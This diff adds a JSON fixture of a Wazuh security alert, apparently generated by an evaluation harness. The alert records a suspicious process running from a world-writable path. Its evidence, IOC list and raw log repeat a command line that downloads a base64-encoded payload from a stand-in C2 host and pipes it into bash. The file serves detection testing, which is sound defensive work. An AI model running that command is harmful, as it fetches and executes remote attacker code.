@@ -1,0 +1,263 @@
+{
+  "contractVersion": 2,
+  "provenance": {
+    "class": "HARNESS_GENERATED",
+    "classBasis": [
+      "rule.groups contains vigix_eval",
+      "location is /var/log/vigix-eval/events.json",
+      "data.vigix block present"
+    ],
+    "source": {
+      "siem": "wazuh",
+      "alertId": "1791028748.1957636",
+      "alertRowId": null,
+      "indexerRef": {
+        "index": "wazuh-alerts-4.x-2026.10.03",
+        "docId": "qsGhAaEBT0qgUD4h6lCr"
+      },
+      "eventKey": null,
+      "manager": "wazuh.manager",
+      "decoder": {
+        "name": "json",
+        "parent": null
+      },
+      "location": "/var/log/vigix-eval/events.json",
+      "inputType": "log"
+    },
+    "agent": {
+      "id": "009",
+      "name": "attack-endpoint",
+      "ip": "172.19.0.8"
+    },
+    "time": {
+      "detectedAt": "2026-10-03T11:59:08.106Z",
+      "reportedAt": null,
+      "reportedAtRaw": null,
+      "eventAt": null,
+      "receivedAt": "2026-10-08T00:00:00.000Z"
+    },
+    "completeness": {
+      "process": "OBSERVED",
+      "file": "OBSERVED"
+    },
+    "missing": []
+  },
+  "detection": {
+    "rule": {
+      "id": "100330",
+      "level": 10,
+      "description": "VIGIX-EVAL: suspicious process executed from a world-writable path",
+      "groups": [
+        "vigix_eval",
+        "process_execution",
+        "vigix_eval"
+      ],
+      "firedTimes": 1,
+      "frequency": null
+    },
+    "mitre": {
+      "techniques": [
+        {
+          "id": "T1059.004",
+          "name": "Unix Shell"
+        }
+      ],
+      "tactics": [
+        "Execution"
+      ]
+    }
+  },
+  "evidence": {
+    "network": {
+      "src": {
+        "ip": null,
+        "port": null
+      },
+      "dst": {
+        "ip": null,
+        "port": null
+      },
+      "dnsQuery": null,
+      "dnsStatus": null,
+      "url": null,
+      "bytesOut": null,
+      "durationSeconds": null,
+      "direction": null
+    },
+    "process": {
+      "image": "/tmp/.cache/kworkerd",
+      "commandLine": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+      "pid": "1450",
+      "guid": null,
+      "user": {
+        "domain": null,
+        "name": "www-data",
+        "raw": "www-data"
+      },
+      "startedAt": null,
+      "integrityLevel": null,
+      "hashes": [],
+      "parent": {
+        "image": null,
+        "commandLine": null,
+        "pid": "1",
+        "guid": null,
+        "user": null,
+        "name": "tail"
+      },
+      "windowsEvent": {
+        "id": null,
+        "channel": null,
+        "provider": null
+      }
+    },
+    "file": {
+      "path": "/tmp/.cache/kworkerd",
+      "hashes": {
+        "md5": null,
+        "sha1": null,
+        "sha256": "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64"
+      }
+    },
+    "syscheck": {
+      "path": null,
+      "operation": null,
+      "detectionMode": null,
+      "hashes": {
+        "after": {
+          "md5": null,
+          "sha1": null,
+          "sha256": null,
+          "lastKnown": false
+        },
+        "before": {
+          "md5": null,
+          "sha1": null,
+          "sha256": null
+        }
+      },
+      "size": {
+        "after": null,
+        "before": null
+      },
+      "permissions": {
+        "after": null,
+        "before": null
+      },
+      "owner": {
+        "after": {
+          "uid": null,
+          "gid": null,
+          "uname": null,
+          "gname": null
+        },
+        "before": {
+          "uid": null,
+          "gid": null,
+          "uname": null,
+          "gname": null
+        }
+      },
+      "modifiedAt": {
+        "after": null,
+        "before": null
+      },
+      "inode": {
+        "after": null,
+        "before": null
+      },
+      "changedAttributes": [],
+      "diffPresent": false
+    },
+    "authentication": {
+      "result": null,
+      "remote": {
+        "ip": null,
+        "port": null
+      },
+      "account": null,
+      "attemptedAccount": null,
+      "accountDomain": null,
+      "accountSid": null,
+      "actor": {
+        "name": null,
+        "domain": null,
+        "sid": null,
+        "isMachineAccount": null
+      },
+      "logon": {
+        "type": null,
+        "id": null,
+        "process": null,
+        "package": null
+      }
+    },
+    "email": {
+      "sender": null,
+      "recipients": [],
+      "subject": null
+    },
+    "powershell": {
+      "scriptBlockText": null,
+      "scriptBlockId": null,
+      "part": null,
+      "totalParts": null
+    },
+    "http": {
+      "requestTarget": null,
+      "method": null,
+      "status": null
+    },
+    "account": {
+      "user": null,
+      "group": null,
+      "uid": null,
+      "gid": null,
+      "home": null,
+      "shell": null
+    }
+  },
+  "iocs": [
+    {
+      "type": "SHA256",
+      "value": "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64",
+      "role": "ARTIFACT",
+      "sourcePath": "data.sha256",
+      "roleBasis": null,
+      "lastKnown": false
+    },
+    {
+      "type": "FILE_PATH",
+      "value": "/tmp/.cache/kworkerd",
+      "role": "ARTIFACT",
+      "sourcePath": "data.file",
+      "roleBasis": null,
+      "lastKnown": false
+    },
+    {
+      "type": "PROCESS_NAME",
+      "value": "/tmp/.cache/kworkerd",
+      "role": "ARTIFACT",
+      "sourcePath": "data.audit.exe",
+      "roleBasis": null,
+      "lastKnown": false
+    },
+    {
+      "type": "COMMAND_LINE",
+      "value": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+      "role": "ARTIFACT",
+      "sourcePath": "data.command",
+      "roleBasis": null,
+      "lastKnown": false
+    },
+    {
+      "type": "COMMAND_LINE",
+      "value": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+      "role": "ARTIFACT",
+      "sourcePath": "data.audit.command",
+      "roleBasis": null,
+      "lastKnown": false
+    }
+  ],
+  "fullLog": "{\"vigix\":{\"event_type\":\"suspicious_process\"},\"audit\":{\"exe\":\"/tmp/.cache/kworkerd\",\"command\":\"curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash\",\"ppid\":1,\"parent\":\"tail\",\"uid\":\"33\",\"user\":\"www-data\",\"pid\":1450},\"command\":\"curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash\",\"file\":\"/tmp/.cache/kworkerd\",\"sha256\":\"c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64\",\"agent_host\":\"attack-endpoint\",\"message\":\"process /tmp/.cache/kworkerd (pid 1450, ppid 1 tail, user www-data, sha256 c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64) running from a world-writable path; parent shell command: curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash\"}"
+}
